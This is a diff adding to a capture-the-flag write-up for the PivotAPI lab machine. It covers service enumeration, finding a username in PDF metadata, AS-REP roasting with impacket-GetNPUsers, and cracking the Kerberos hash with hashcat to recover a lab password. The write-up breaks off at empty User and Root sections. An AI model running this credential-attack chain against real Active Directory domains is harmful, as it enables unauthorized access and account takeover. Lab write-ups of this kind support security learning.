@@ -120,3 +120,147 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 58.10 seconds
 
 ```
+
+- `smb`
+```
+└─$ smbclient -N -L //10.10.10.240                                                              
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.240 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+```
+- `dns`
+```
+└─$ dig axfr LicorDeBellota.htb @PivotAPI.LicorDeBellota.htb                                                   
+
+; <<>> DiG 9.19.17-1-Debian <<>> axfr LicorDeBellota.htb @PivotAPI.LicorDeBellota.htb
+;; global options: +cmd
+; Transfer failed.
+
+```
+
+- `ldapsearch`
+```
+└─$ ldapsearch -H ldap://LicorDeBellota.htb -x -s base namingcontexts           
+# extended LDIF
+#
+# LDAPv3
+# base <> (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts 
+#
+
+#
+dn:
+namingcontexts: DC=LicorDeBellota,DC=htb
+namingcontexts: CN=Configuration,DC=LicorDeBellota,DC=htb
+namingcontexts: CN=Schema,CN=Configuration,DC=LicorDeBellota,DC=htb
+namingcontexts: DC=DomainDnsZones,DC=LicorDeBellota,DC=htb
+namingcontexts: DC=ForestDnsZones,DC=LicorDeBellota,DC=htb
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+
+```
+```
+└─$ ldapsearch -H ldap://LicorDeBellota.htb -x -b "DC=LicorDeBellota,DC=htb"
+# extended LDIF
+#
+# LDAPv3
+# base <DC=LicorDeBellota,DC=htb> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# search result
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
+ tion a successful bind must be completed on the connection., data 0, v4563
+
+# numResponses: 1
+
+```
+
+- No results for `rpc`
+- `ftp`
+```
+└─$ ftp anonymous@10.10.10.240
+Connected to 10.10.10.240.
+220 Microsoft FTP Service
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> ls
+229 Entering Extended Passive Mode (|||57367|)
+150 Opening ASCII mode data connection.
+02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
+02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
+02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
+02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
+08-08-20  01:18PM               219091 notes1.pdf
+08-08-20  01:34PM               279445 notes2.pdf
+08-08-20  01:41PM                  105 README.txt
+02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
+226 Transfer complete.
+
+```
+
+- Running `exiftool` on `pdf` files shows `LicorDeBellota.htb\kaorz`
+```
+======== notes2.pdf
+ExifTool Version Number         : 12.67
+File Name                       : notes2.pdf
+Directory                       : .
+File Size                       : 279 kB
+File Modification Date/Time     : 2020:08:08 12:34:25+01:00
+File Access Date/Time           : 2023:10:06 19:12:03+01:00
+File Inode Change Date/Time     : 2023:10:06 19:12:03+01:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.5
+Linearized                      : No
+Page Count                      : 5
+XMP Toolkit                     : Image::ExifTool 12.03
+Creator                         : Kaorz
+Publisher                       : LicorDeBellota.htb
+Producer                        : cairo 1.10.2 (http://cairographics.org)
+```
+## Foothold
+- Let's check if user is `AS-REP`-roastable
+```
+└─$ impacket-GetNPUsers -dc-ip PivotAPI.LicorDeBellota.htb LicorDeBellota.htb/kaorz -no-pass
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Getting TGT for kaorz
+$krb5asrep$23$kaorz@LICORDEBELLOTA.HTB:117660010b88116ef19ce2f9e608d1d9$a8f47a80fddd556b91bb360af849916358388168cf2ed0c2783c95ff09d799d504477fefe0d1a9ab33a92243939260e558b739cedd2a8c3d61bf85ae56360069cd38a4f14b04865afdbbbf99a3816da14b41058a0249c62c180d50337a6e3c27da5cdde876ca8b4f70f1d5624c1f3358e0a451bb5ec9cb3ee580148951680f5d06f2ce8c11bf61cb8600cbb290dd046a12ad9c8cae68e4ca9706c904189e4ef0a192f8cc192e6286241547ae151111d074323e54a174b945156365f6db2f80d9b7ec558ffa64b7fcd93206f055ecfbf973fa4fff67f20ea88d63fdc29d6aea709c7da2d8073ef9f7fcc3f36a39160138e0679042f7fd8441
+```
+
+- Let's crack it
+  - `kaorz:Roper4155`
+```
+└─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1435/2934 MB (512 MB allocatable), 2MCU
+...
+$krb5asrep$23$kaorz@LICORDEBELLOTA.HTB:117660010b88116ef19ce2f9e608d1d9$a8f47a80fddd556b91bb360af849916358388168cf2ed0c2783c95ff09d799d504477fefe0d1a9ab33a92243939260e558b739cedd2a8c3d61bf85ae56360069cd38a4f14b04865afdbbbf99a3816da14b41058a0249c62c180d50337a6e3c27da5cdde876ca8b4f70f1d5624c1f3358e0a451bb5ec9cb3ee580148951680f5d06f2ce8c11bf61cb8600cbb290dd046a12ad9c8cae68e4ca9706c904189e4ef0a192f8cc192e6286241547ae151111d074323e54a174b945156365f6db2f80d9b7ec558ffa64b7fcd93206f055ecfbf973fa4fff67f20ea88d63fdc29d6aea709c7da2d8073ef9f7fcc3f36a39160138e0679042f7fd8441:Roper4155
+```
+
+## User
+
+
+## Root
